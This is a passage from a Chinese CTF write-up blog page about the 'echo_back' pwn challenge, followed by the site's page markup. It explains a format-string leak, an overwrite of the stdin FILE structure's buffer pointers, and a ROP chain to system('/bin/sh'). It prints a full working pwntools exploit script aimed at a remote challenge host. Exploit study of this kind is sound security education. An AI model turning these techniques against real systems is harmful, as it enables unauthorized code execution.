+<p>对于_IO_buf_base之前的数据(_IO_write_base、_IO_write_ptr、_IO_write_end)，我们最好原样的放回，不然不知道会出现什么问题，经过调试，发现它们的值都是<strong>0x83 + _IO_2_1_stdin_addr</strong>，然后<strong>接下来，我们覆盖_IO_buf_base和_IO_buf_end</strong>，</p>
+<p>于是，我们的payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x83</span> + _IO_2_1_stdin_addr)*<span class="number">3</span> + p64(main_ret) + p64(main_ret + <span class="number">0x8</span> * <span class="number">3</span>)  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">sh.sendafter(<span class="string">&#x27;length:&#x27;</span>,payload)  </span><br></pre></td></tr></table></figure>
+
+<p>我们<strong>为什么在</strong>length:<strong>后面发送payload，因为这个地方用到了scanf</strong></p>
+<img src="/ha1vk/2019/11/17/echo_back/image11.JPG" class="">
+
+<p>现在，我们**[得绕过一个判断，这样调用scanf输入数据时，就会往目标处输入数据]{.mark}**</p>
+<img src="/ha1vk/2019/11/17/echo_back/image12.JPG" class="">
+
+<p>由于之前，<strong>我们覆盖结构体数据时，后面执行了这一步，使得fp-&gt;_IO_read_end +&#x3D; len(payload)</strong></p>
+<img src="/ha1vk/2019/11/17/echo_back/image13.JPG" class="">
+
+<p>而<strong>getchar()的作用是使fp-&gt;_IO_read_ptr加1</strong></p>
+<p>由于在覆盖结构体后，scanf的后面有一个getchar，执行了一次，因此，我们还需要执行len(payload)-1次getchar()，然后接下来发送我们的rop即可获得shell</p>
+<p>我们最终的exp脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">   </span><br><span class="line">libcpath = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>  </span><br><span class="line"><span class="comment">#sh = process(&#x27;./echo_back&#x27;)  </span></span><br><span class="line">sh = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">48430</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./echo_back&#x27;</span>)  </span><br><span class="line">libc = ELF(libcpath)  </span><br><span class="line"><span class="comment">#main在elf中的静态地址  </span></span><br><span class="line">main_s_addr = <span class="number">0xC6C</span>  </span><br><span class="line"><span class="comment">#pop rdi  </span></span><br><span class="line"><span class="comment">#retn  </span></span><br><span class="line"><span class="comment">#在elf中的静态地址  </span></span><br><span class="line">pop_s_rdi = <span class="number">0xD93</span>  </span><br><span class="line">   </span><br><span class="line">_IO_2_1_stdin_ = libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]  </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echoback</span>(<span class="params">content</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>,<span class="string">&#x27;7&#x27;</span>)  </span><br><span class="line">   sh.send(content)  </span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setName</span>(<span class="params">name</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;name:&#x27;</span>,name)  </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">echoback(<span class="string">&#x27;%19$p&#x27;</span>)  </span><br><span class="line">   </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line"><span class="comment">#泄露__libc_start_main的地址  </span></span><br><span class="line">__libc_start_main = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>) - <span class="number">0xF0</span>  </span><br><span class="line"><span class="comment">#得到libc加载的基地址  </span></span><br><span class="line">libc_base = __libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]  </span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()  </span><br><span class="line">_IO_2_1_stdin_addr = libc_base + _IO_2_1_stdin_  </span><br><span class="line">_IO_buf_base = _IO_2_1_stdin_addr + <span class="number">0x8</span> * <span class="number">7</span>  </span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;iobase=&#x27;</span>,<span class="built_in">hex</span>(_IO_buf_base)  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#泄露main的地址  </span></span><br><span class="line">echoback(<span class="string">&#x27;%13$p&#x27;</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line">main_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>) - <span class="number">0x9C</span>  </span><br><span class="line">elf_base = main_addr - main_s_addr  </span><br><span class="line">pop_rdi = elf_base + pop_s_rdi  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;elf base=&#x27;</span>,<span class="built_in">hex</span>(pop_rdi)  </span><br><span class="line">   </span><br><span class="line">echoback(<span class="string">&#x27;%12$p&#x27;</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line"><span class="comment">#泄露main的ebp的值  </span></span><br><span class="line">main_ebp = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)  </span><br><span class="line"><span class="comment">#泄露存放(main返回地址)的地址  </span></span><br><span class="line">main_ret = main_ebp + <span class="number">0x8</span>  </span><br><span class="line">   </span><br><span class="line">setName(p64(_IO_buf_base))  </span><br><span class="line"><span class="comment">#覆盖_IO_buf_base的低1字节为0  </span></span><br><span class="line">echoback(<span class="string">&#x27;%16$hhn&#x27;</span>)  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#修改_IO_2_1_stdin_结构体  </span></span><br><span class="line">payload = p64(<span class="number">0x83</span> + _IO_2_1_stdin_addr)*<span class="number">3</span> + p64(main_ret) + p64(main_ret + <span class="number">0x8</span> * <span class="number">3</span>)  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">sh.sendafter(<span class="string">&#x27;length:&#x27;</span>,payload)  </span><br><span class="line">sh.sendline(<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line"><span class="comment">#不断调用getchar()使fp-&gt;_IO_read_ptr与使fp-&gt;_IO_read_end相等  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload)-<span class="number">1</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#对目标写入ROP  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">payload = p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)  </span><br><span class="line">sh.sendafter(<span class="string">&#x27;length:&#x27;</span>,payload)  </span><br><span class="line"><span class="comment">#这个换行最好单独发送  </span></span><br><span class="line">sh.sendline(<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line"><span class="comment">#getshell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">   </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag"># 格式化字符串漏洞</a>
+              <a href="/ha1vk/tags/IO-FILE/" rel="tag"># IO FILE</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/11/15/supermarket/" rel="prev" title="Supermarket">
+      <i class="fa fa-chevron-left"></i> Supermarket
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/11/18/dubblesort/" rel="next" title="dubblesort">
+      dubblesort <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
